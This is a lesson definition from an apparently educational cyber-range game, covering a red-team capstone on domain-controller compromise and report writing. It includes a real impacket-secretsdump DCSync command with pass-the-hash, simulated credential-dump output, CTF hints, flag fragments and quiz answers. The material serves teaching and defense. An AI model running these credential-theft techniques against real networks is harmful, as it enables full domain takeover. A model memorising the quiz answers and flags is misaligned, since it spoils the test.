    wonder: { name: "The Crown Jewels", location: "Authorized Red-Team Engagement", era: "Present Day", emoji: "👑" },
    id: "cap-04",
    order: 4,
    title: "Domain Compromise, Exfil & Report",
    subtitle: "Reach Domain Admin — then write the report that fixes it",
    category: "cybersecurity",
    xp: 250,
    badge: { id: "badge-cap-report", name: "Engagement Complete", emoji: "👑" },
    challengeType: "ctf",
    info: {
      tagline: "Owning the domain controller is the climax — but the report, not the trophy, is the deliverable that makes you a professional.",
      year: 2015,
      overview: [
        "The engagement reaches its objective at the domain controller. Having pivoted to the internal network, you attack the identity infrastructure using the credentials gathered along the way — the pass-the-hash and credential techniques from the Password epoch, now aimed at Active Directory. A reused local-admin hash, a Kerberoasted service account, or a dumped credential gets you onto the DC, and from there DCSync (impersonating a domain controller to pull every account's hash, including the krbtgt key) yields Domain Admin: complete control of the organization's identity, every user, every system. In the capstone you capture the trophy flag and perform a simulated exfiltration — proving impact without ever stealing real data, exactly as the rules of engagement specified.",
        "And then comes the part that actually matters: the report. Reaching Domain Admin is the demonstration; the deliverable is a clear, prioritized report that turns the attack into remediation. It documents the full attack path (recon → foothold → escalation → pivot → domain compromise), rates each finding by risk, provides concrete, actionable fixes mapped to where the chain could have been broken — patch Apache (no foothold), harden the host (no escalation), segment the network (no pivot), enforce MFA and LAPS and tiered admin (no domain takeover) — and includes the evidence and an executive summary leadership can act on. A red team that pops the DC but writes a vague report has failed the client; the entire point is to make the organization measurably harder to breach. That is where the Cyber Range ends: every offensive technique you learned, assembled into one engagement, delivered as the defense.",
      ],
      technical: {
        title: "Domain Compromise + the Deliverable",
        body: [
          "Reaching Domain Admin (Password/AD techniques, applied):\n- Pass-the-hash a reused local-admin hash to a privileged host; or Kerberoast a service account and crack it offline.\n- Land on the DC; DCSync (impacket secretsdump / mimikatz) to pull all hashes incl. krbtgt → Domain Admin.\n- Capture the trophy flag; perform SIMULATED exfil (prove impact, take no real data).",
          "The report (the actual deliverable):\n- Attack-path narrative: recon → foothold → escalation → pivot → domain compromise, with evidence + timestamps.\n- Each finding rated by risk (likelihood × impact / CVSS), with a concrete remediation.\n- Map fixes to where the chain breaks: patch (foothold), harden (escalation), segment (pivot), MFA/LAPS/tiered-admin (domain).\n- Executive summary for leadership + technical detail for engineers; a retest offer.",
          "The defensive close — break any link, stop the chain:\n- Patch reachable services (no foothold).  Harden hosts / least-privilege (no escalation).\n- Segment the network (no pivot).  MFA + LAPS + tiered admin + protect krbtgt (no domain takeover).\n- Monitor at every step (recon scanning, new shells, lateral SMB, DCSync) — detection is defense in depth.",
        ],
        codeExample: {
          label: "DCSync to Domain Admin — then the report",
          code: `# On/against the DC (via the pivot), using gathered creds:
$ proxychains impacket-secretsdump -hashes :<localadmin_hash> CORP/admin@10.10.20.10
  [*] Dumping Domain Credentials (DCSync)
  krbtgt:502:aad3b...:<krbtgt hash>          # Domain Admin / full domain control
  CORP\\Administrator:500:...                  # every account's hash

# Trophy + SIMULATED exfil (no real data — per the ROE)
$ cat \\\\corp-dc\\SYSVOL\\trophy.txt   ->  (engagement flag)

# DELIVERABLE — the report:
#  Path: recon -> Apache 2.4.49 RCE -> root (cron) -> pivot -> DCSync
#  Fixes: patch Apache | harden host | SEGMENT | MFA+LAPS+tiered admin | protect krbtgt`,
        },
      },
      incident: {
        title: "From One Box to Domain Admin — and the Report That Prevents It",
        when: "The standard arc of red-team engagements and real breaches alike",
        where: "Active Directory environments (the identity backbone of most enterprises)",
        impact: "DCSync/Domain Admin is total organizational compromise — and the report is what prevents the real thing",
        body: [
          "The recon-to-Domain-Admin chain you just ran is the documented arc of countless real breaches: an internet-adjacent foothold, local escalation, a flat-network pivot, reused credentials, and DCSync to own the domain. Each link is well understood, and each is preventable. The reason red teams exist is to walk that chain under authorization and then hand the organization a map of exactly where to break it — before a criminal walks it for real.",
          "That's why the report, not the trophy, is the profession. A great engagement leaves the client with prioritized, actionable remediation tied to a concrete attack narrative and evidence, an executive summary that drives budget and decisions, and an offer to retest. Break the foothold with patching, the escalation with hardening, the pivot with segmentation, and the domain takeover with MFA, LAPS, and krbtgt protection — and the same attacker who reached Domain Admin in the lab gets stuck at the first locked door in production. The Cyber Range ends where security begins: turning the attack into the defense.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Pivot + creds", sub: "pass-the-hash / Kerberoast", type: "attacker" },
          { label: "Domain Controller", sub: "DCSync — all hashes", type: "system" },
          { label: "Domain Admin", sub: "total identity control", type: "victim" },
          { label: "The REPORT", sub: "→ remediation = the deliverable", type: "result" },
        ],
      },
      timeline: [
        { year: 2015, event: "DCSync/mimikatz make domain compromise routine in red teams" },
        { year: 2018, event: "Reporting + remediation become the recognized core deliverable", highlight: true },
        { year: 2021, event: "Identity (AD) hardening + tiered admin standard against this chain" },
      ],
      keyTakeaways: [
        "The objective is the domain controller; DCSync pulls all hashes (incl. krbtgt) → Domain Admin",
        "Use gathered credentials (pass-the-hash, Kerberoast) to reach AD — the Password epoch, applied",
        "Capture the trophy and SIMULATE exfil — prove impact, take no real data (per the ROE)",
        "The report is the deliverable: attack-path narrative + risk ratings + concrete, prioritized fixes",
        "Break any link — patch (foothold), harden (escalation), segment (pivot), MFA/LAPS (domain) — and the chain fails",
      ],
      references: [
        { title: "MITRE ATT&CK — Credential Access / DCSync (T1003.006)", url: "https://attack.mitre.org/techniques/T1003/006/" },
        { title: "PTES — Reporting", url: "http://www.pentest-standard.org/index.php/Reporting" },
      ],
    },
    quiz: {
      questions: [
        { id: "cap-04-q1", type: "Objective", challenge: "The target.", text: "What is the objective host in an AD engagement?", options: ["The domain controller (control of all identities)", "A printer", "The web server only", "The attacker's box"], correctIndex: 0, explanation: "Owning the DC means owning the domain." },
        { id: "cap-04-q2", type: "Technique", challenge: "Pull all hashes.", text: "What does DCSync do?", options: ["Impersonates a DC to replicate/pull every account's hash (incl. krbtgt)", "Scans ports", "Encrypts the DC", "Patches AD"], correctIndex: 0, explanation: "DCSync yields all domain hashes → Domain Admin." },
        { id: "cap-04-q3", type: "Credentials", challenge: "Get to the DC.", text: "Which gathered-credential techniques reach AD?", options: ["Pass-the-hash and Kerberoasting", "SQL injection only", "XSS only", "Port scanning"], correctIndex: 0, explanation: "Reused hashes and crackable service tickets get you to the DC." },
        { id: "cap-04-q4", type: "Ethics", challenge: "Exfil.", text: "In an authorized engagement, how is exfiltration handled?", options: ["Simulated — prove impact, take no real data (per the ROE)", "Steal everything", "Sell the data", "Ignore it"], correctIndex: 0, explanation: "You demonstrate impact without exfiltrating real data." },
        { id: "cap-04-q5", type: "Deliverable", challenge: "The point.", text: "What is the actual deliverable of the engagement?", options: ["A prioritized report turning the attack into remediation", "A Domain Admin screenshot", "Persistence", "A new exploit"], correctIndex: 0, explanation: "The report and remediation are the value, not the trophy." },
        { id: "cap-04-q6", type: "Report", challenge: "Contents.", text: "What must a good report include?", options: ["Attack-path narrative, risk-rated findings, concrete fixes, evidence, exec summary", "Only the flag", "Just a tool list", "Nothing technical"], correctIndex: 0, explanation: "Actionable, evidenced, prioritized remediation is the standard." },
        { id: "cap-04-q7", type: "Defense", challenge: "Break the chain.", text: "How do you stop the recon→Domain-Admin chain?", options: ["Break any link: patch, harden, segment, MFA/LAPS/tiered-admin, protect krbtgt", "One firewall rule", "A longer password", "Hope"], correctIndex: 0, explanation: "Breaking any single link stops the whole chain." },
        { id: "cap-04-q8", type: "Meaning", challenge: "Where it ends.", text: "What is the unifying lesson of the Cyber Range?", options: ["Every offensive technique, understood, becomes the defense", "Offense is all that matters", "Reports are optional", "Tools beat methodology"], correctIndex: 0, explanation: "Learn the attack to build the defense — the Range's whole thesis." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.20.5", hostname: "corp-web (pivot)", os: "Linux (root) → internal" },
      targetMachine: { ip: "10.10.20.10", hostname: "corp-dc", os: "Windows Server (Domain Controller)", openPorts: "445, 88 (internal)", vulnerability: "reused local-admin hash → DCSync → Domain Admin" },
      scenario: "Pivoted to the internal network, you have a reused local-admin hash. Reach the domain controller (10.10.20.10), DCSync to Domain Admin, capture the trophy with simulated exfil — then write the report that makes the whole chain a remediation plan.",
      hint: "Pass-the-hash to the DC and DCSync for Domain Admin, then produce the engagement report.",
      hints: [
        "Read the briefing. Run: cat briefing.txt",
        "DCSync the domain controller to Domain Admin. Run: dcsync 10.10.20.10",
        "Write the engagement report (the deliverable). Run: write-report",
        "Run 'assemble' to view the assembled flag and the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{D0M41N_", label: "Domain Compromise Briefing" },
        { trigger: "dcsync 10.10.20.10", value: "4DM1N_", label: "Domain Admin via DCSync" },
        { trigger: "write-report", value: "R3P0RT_D0N3}", label: "Engagement Report Delivered" },
      ],
      files: {
        "/briefing.txt": [
          "ENGAGEMENT — LAB 4: DOMAIN COMPROMISE & REPORT",
          "Pivoted in. Have a reused local-admin hash. DC at 10.10.20.10.",
          "Goal: DCSync -> Domain Admin -> trophy (simulated exfil) -> REPORT.",
          "Sequence: dcsync 10.10.20.10 -> write-report -> assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "dcsync": (args: string[]) => {
          if (args[0] !== "10.10.20.10") return { lines: ["Usage: dcsync 10.10.20.10"] };
          return {
            lines: [
              "$ proxychains impacket-secretsdump -hashes :31d6cfe0...089c0 CORP/admin@10.10.20.10",
              "  [*] Dumping Domain Credentials (DCSync)...",
              "  krbtgt:502:aad3b...:<krbtgt-hash>           <-- full domain control",
              "  CORP\\Administrator:500:...                   (every account's hash)",
              "  [+] DOMAIN ADMIN achieved.",
              "$ cat //corp-dc/SYSVOL/trophy.txt   ->  (trophy; SIMULATED exfil — no real data)",
              "",
              ">> LEARN: reused local-admin hash -> DC -> DCSync -> own the whole domain",
              ">> BLUE TEAM: MFA + LAPS + tiered admin + protect krbtgt. Fragment collected.",
            ],
          };
        },
        "write-report": (_args: string[]) => ({
          lines: [
            "[ENGAGEMENT REPORT — Corp Inc.]  (the real deliverable)",
            "Attack path:",
            "  recon -> Apache 2.4.49 RCE (foothold) -> writable cron (root)",
            "       -> pivot to 10.10.20.0/24 -> reused hash -> DCSync (Domain Admin)",
            "Findings (risk-rated) + fixes — break ANY link to stop the chain:",
            "  [CRIT] Unpatched Apache 2.4.49   -> patch (kills the foothold)",
            "  [HIGH] World-writable root cron   -> fix permissions (kills escalation)",
            "  [CRIT] Flat network / no segmentation -> SEGMENT (kills the pivot)",
            "  [CRIT] Reused local-admin + no MFA -> LAPS + MFA + tiered admin (kills domain takeover)",
            "  + Executive summary, evidence, timestamps, and a retest offer.",
            "",
            ">> LEARN: the REPORT — not Domain Admin — is the deliverable that makes you a pro",
            "   Every attack you ran, reversed, is the client's prioritized defense.",
            "   THE CYBER RANGE: learn the attack to build the defense. Run 'assemble'.",
          ],
        }),
      },
    },
  },
];
